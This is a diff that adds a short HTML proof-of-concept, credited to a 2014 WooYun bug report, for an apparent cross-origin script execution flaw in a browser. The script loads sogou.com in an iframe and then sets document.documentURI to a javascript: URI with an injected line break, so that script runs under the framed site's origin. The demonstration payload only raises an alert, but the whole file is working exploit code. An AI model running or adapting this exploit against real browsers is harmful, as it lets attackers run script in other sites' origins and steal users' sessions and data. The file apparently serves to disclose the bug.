@@ -1,0 +1,13 @@
+via http://www.wooyun.org/bugs/wooyun-2014-047674
+<body>
+<script>
+i = document.body.appendChild(document.createElement("iframe"));
+i.src = "http://www.sogou.com";
+i.onload = function()
+{
+	document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)";
+	i.contentWindow.location = "";
+
+}
+</script>
+</body>
